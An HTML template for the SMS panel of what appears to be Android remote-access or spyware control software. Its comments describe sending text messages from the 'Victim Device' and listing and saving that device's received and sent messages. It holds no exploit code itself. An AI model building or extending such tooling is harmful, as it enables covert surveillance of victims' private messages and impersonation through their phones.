<div class="ui top attached tabular menu border-bottom">
    <a class="item active border" data-tab="sendSms">Send SMS</a>
    <a class="item border" data-tab="smsLists"
        ng-click="clearLogs(); activateDefaultTabSmsLists(); getInboxSMSList()">SMS Lists</a>
</div>

<!-- "Send SMS" Tab for sending text messages from the Victim Device -->
<div class="ui bottom attached tab segment active h90 center aligned border" style="height: 304px;" data-tab="sendSms">
    <br>
    <div class="ui labeled input">
        <div class="ui black label">
            TO://
        </div>
        <input type="text" class="bg2" ng-model="phoneNo" placeholder="Phone Number">
    </div>
    <br>
    <label>Message:</label>
    <br>
    <textarea class="w100 h40 bg2" ng-model="msg" placeholder="Message to send.."></textarea>
    <br>
    <br>
    <button class="ui labeled icon red button" ng-click="clearLogs(); SendSMS(phoneNo,msg);"> <i
            class="send outline icon"></i>SEND</button>
</div>

<!-- "SMS Lists" Tab containing nested Inbox and Outbox Tabs -->
<div class="ui bottom attached tab segment h90 border" data-tab="smsLists" style="height: 304px">
    <div class="ui top attached tabular menu border-bottom">
        <a class="item active border" data-tab="inboxSMSList" ng-click="clearLogs(); getInboxSMSList()">Inbox List</a>
        <a class="item border" data-tab="sentSMSList" ng-click="clearLogs(); getSentSMSList()">Outbox
            List</a>
    </div>

    <!-- "Inbox List" Tab for viewing a list of Text Messages the Victim Device has received -->
    <div class="ui bottom attached tab {{inboxLoading}} segment h90 border" data-tab="inboxSMSList" id="inboxParent">
        <table class="ui very compact striped table bg">
            <thead>
                <tr>
                    <th>
                        <div class="ui label bg">
                            <i class="mail icon"></i> <span ng-bind="smsSize"></span>
                            <span class="detail">Messages</span>
                        </div>
                    </th>
                    <th>
                        <div class="right aligned">
                            <a class="ui red label" ng-click="clearLogs(); SaveInboxSMS()">
                                <i class="save icon"></i> Save
                            </a>
                        </div>
                    </th>
                </tr>
            </thead>
            <tbody infinite-scroll="increaseLimit('inbox')" infinite-scroll-container='"#inboxParent"'>
                <tr ng-repeat="sms in receivedList | limitTo:inboxBarLimit">
                    <td ng-bind="sms.phoneNo"></td>
                    <td ng-bind="sms.msg"></td>
                </tr>
            </tbody>
        </table>
    </div>

    <!-- "Outbox List" Tab for viewing a list of Text Messages sent from the Victim Device -->
    <div class="ui bottom attached tab {{sentLoading}} segment bg border" data-tab="sentSMSList" id="sentParent">
        <table class="ui very compact striped table bg">
            <thead>
                <tr>
                    <th>
                        <div class="ui label bg">
                            <i class="mail icon"></i> <span ng-bind="smsSize"></span>
                            <span class="detail">Messages</span>
                        </div>
                    </th>
                    <th>
                        <div class="right aligned">
                            <a class="ui red label" ng-click="clearLogs(); SaveSentSMS()">
                                <i class="save icon"></i> Save
                            </a>
                        </div>
                    </th>
                </tr>
            </thead>
            <tbody infinite-scroll="increaseLimit('outbox')" infinite-scroll-container='"#sentParent"'>
                <tr ng-repeat="sms in sentList | limitTo:sentBarLimit">
                    <td ng-bind="sms.phoneNo"></td>
                    <td ng-bind="sms.msg"></td>
                </tr>
            </tbody>
        </table>
    </div>
</div>
